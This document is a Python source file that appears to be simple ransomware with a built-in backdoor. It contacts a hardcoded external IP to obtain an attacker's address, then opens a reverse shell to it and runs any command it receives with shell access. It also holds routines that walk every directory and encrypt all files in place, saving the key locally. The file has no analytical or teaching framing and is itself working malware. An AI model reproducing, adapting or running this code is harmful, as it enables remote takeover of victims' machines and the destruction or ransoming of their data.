import os
import socket
import subprocess
from cryptography.fernet import Fernet

files = []

def find_files(dir=""):
    global files
    if dir != "":
        for i, (t, file, _) in enumerate(files):
            if t == "d" and file == dir:
                files[i][2] = True
    else:
        dir = os.getcwd()
    for file in os.listdir(dir):
        if file == "notaransomware.py" or file == "decrypt.py" or file == "thekey.key":
            continue
        file = f"{dir}\\{file}"
        print(f"found `{file}`...")
        if os.path.isfile(file):
            files.append(["f", file, False])
        elif os.path.isdir(file):
            files.append(["d", file, False])
        else:
            files.append(["?", file, False])

def find_more_files():
    global files
    for (t, file, found_already) in files:
        if t == "d" and not found_already:
            find_files(file)
            find_more_files()

BUFFER_SIZE = 512

def get_lan_ip_from_mid_server():
    global BUFFER_SIZE
    REQUEST_LAN_IP_BYTES            = b"\x01"
    ABOUT_TO_RECIEVE_LAN_IP_BYTES   = b"\x02"
    OKAY_BYTES                      = b"\x03"

    s = socket.socket()
    try:
        s.connect(("175.45.180.103", 55037))
    except TimeoutError:
        get_lan_ip_from_mid_server()
    msg = b""

    while msg != ABOUT_TO_RECIEVE_LAN_IP_BYTES:
        msg = s.recv(BUFFER_SIZE)
        s.send(REQUEST_LAN_IP_BYTES)

    lan_ip = s.recv(BUFFER_SIZE).decode()
    s.send(OKAY_BYTES)
    s.close()

    return lan_ip

def setup_backdoor(lan_ip):
    global BUFFER_SIZE
    PROMPT = "\n[type :help for help]-> "

    s = socket.socket()
    s.connect((lan_ip, 55038))

    while True:
        s.send(PROMPT.encode())
        msg = s.recv(BUFFER_SIZE).decode()

        if msg.strip() == ":exit":
            break

        if msg.startswith(":cd"):
            os.chdir(msg[3:].strip())
            continue

        proc = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
    
    s.close()


def main():
    lan_ip = get_lan_ip_from_mid_server()
    print(f"LAN IP: {lan_ip}")
    setup_backdoor(lan_ip)
    exit()

    # setup an extremely basic backdoor here so the attacker can choose what to encrypt.

    find_files()
    find_more_files()

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as f:
        f.write(key)

    for (t, file, _) in files:
        if t == "?": print("something unexpected happened")
        if t != "f":
            continue   
        with open(file, "rb") as f:
            contents = f.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file, "wb") as f:
            f.write(encrypted_contents)
        
if __name__ == "__main__":
    main()